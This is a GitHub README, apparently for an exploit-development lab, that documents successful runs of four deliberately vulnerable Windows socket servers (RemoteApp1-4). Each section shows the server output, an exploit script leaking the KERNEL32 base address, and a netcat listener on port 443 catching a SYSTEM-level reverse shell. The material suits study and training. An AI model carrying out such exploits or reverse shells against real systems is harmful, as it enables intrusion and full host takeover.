- from https://github.com/Sh3lldon/RemoteApp

# Successful run RemoteApp.exe

- run app on target system:

    ```
    PS C:\> .\RemoteApp.exe
    [*] Initialising Winsock...
    [+] Initialised
    [+] Socket created
    [+] Bind done
    [+] Wainting for incoming connection....
    [+] Client connected
    [+] send completed
    [+] recv completed
    User Canary: 11223352
    User opcode: 900
    Calling Function1
    -2 thread ended connecion!
    [+] Client connected
    [+] send completed
    [+] recv completed
    User Canary: 11223b42
    User opcode: 902
    Calling Function3
    ```

- run exploit on attacker system:

    ```
    $ ./exploit1.py 192.168.232.10
    [+] Leaked address of KERNEL32.dll: 0x77520000
    [+] Sent exploit; reverse shell should be incoming
    ```

    ```
    $ nc -vlnp 443
    listening on [any] 443 ...
    connect to [192.168.45.250] from (UNKNOWN) [192.168.232.10] 52258
    Microsoft Windows [Version 10.0.16299.15]
    (c) 2017 Microsoft Corporation. All rights reserved.

    C:\>whoami
    whoami
    nt authority\system
    ```

# Successful run RemoteApp2.exe

- run app on target system:

    ```
    PS C:\> .\RemoteApp2.exe
    [*] Initiaizing WS2_32.dll
    [+] WS2_32.dll successfully initialized
    [+] Socket created
    [+] Bind created
    [+] Listening incoming connection
    [+] Client connected
    User canary: cccccccc
    User Canary2: aabbccdd
    User Canary3: eeff0102
    [*] Calling Function2
    [+] Function2 successfully completed
    [+] Client connected
    User canary: cccccccc
    User Canary2: aabbccdd
    User Canary3: eeff0102
    [*] Calling Function3
    ```

- run exploit on attacker system:

    ```
    $ ./exploit2.py 192.168.232.10
    [+] Leaked address of KERNEL32.dll: 0x77520000
    [+] Sent exploit; reverse shell should be incoming
    ```

    ```
    $ nc -vlnp 443
    listening on [any] 443 ...
    connect to [192.168.45.250] from (UNKNOWN) [192.168.232.10] 52417
    Microsoft Windows [Version 10.0.16299.15]
    (c) 2017 Microsoft Corporation. All rights reserved.

    C:\>whoami
    whoami
    nt authority\system
    ```

# Successful run RemoteApp3.exe

- run app on target system:

    ```
    PS C:\> .\RemoteApp3.exe
    [*] Initializing WS2_32.dll....
    [+] WS2_32.dll initialized successfully
    [+] Socket created
    [+] Bind created
    [+] Listening incoming connection
    [+] Client connected
    [+] Send completed
    [+] Received 44 bytes from client
    User canary1: deadbeef
    User canary2: c0decafe
    User canary3: d0d0face
    check1: 41414141
    check2: 42424242
    check3: 43434343
    check4: 44444444
    [*] Calling Function2
    [+] Client connected
    [+] Send completed
    [+] Received 2588 bytes from client
    User canary1: deadbeef
    User canary2: c0decafe
    User canary3: d0d0face
    check1: 41414141
    check2: 42424242
    check3: 43434343
    check4: 44444444
    [*] Calling Function4
    ```

- run exploit on attacker system:

    ```
    $ ./exploit3.py 192.168.232.10
    [+] Leaked address of KERNEL32.dll: 0x77520000
    [+] Sent exploit; reverse shell should be incoming
    ```

    ```
    $ nc -vlnp 443
    listening on [any] 443 ...
    connect to [192.168.45.250] from (UNKNOWN) [192.168.232.10] 52906
    Microsoft Windows [Version 10.0.16299.15]
    (c) 2017 Microsoft Corporation. All rights reserved.

    C:\>whoami
    whoami
    nt authority\system
    ```

# Successful run RemoteApp4.exe

- run app on target system:

    ```
    PS C:\> .\RemoteApp4.exe
    [*] Initializing WS2_32.dll
    [+] WS2_32.dll initialized
    [+] Socket created
    [+] Bind created
    [+] Waiting for incoming connection
    [+] Client connected
    [+] Send done
    [+] Received 68 bytes from client
    [+] Client connected
    [+] Send done
    [+] Received 66 bytes from client
    [+] Client connected
    [+] Send done
    [+] Received 2722 bytes from client
    ```

- run exploit on attacker system:

    ```
    $ ./exploit4.py 192.168.215.10
    [+] Leaked address of b'KERNEL32.DLL': 0x77520000
    [+] Leaked address of b'WS2_32.DLL': 0x77770000
    [+] Sent exploit; reverse shell should be incoming
    ```

    ```
    $ nc -vlnp 443
    listening on [any] 443 ...
    connect to [192.168.45.232] from (UNKNOWN) [192.168.215.10] 50200
    Microsoft Windows [Version 10.0.16299.15]
    (c) 2017 Microsoft Corporation. All rights reserved.

    C:\>whoami
    whoami
    nt authority\system
    ```
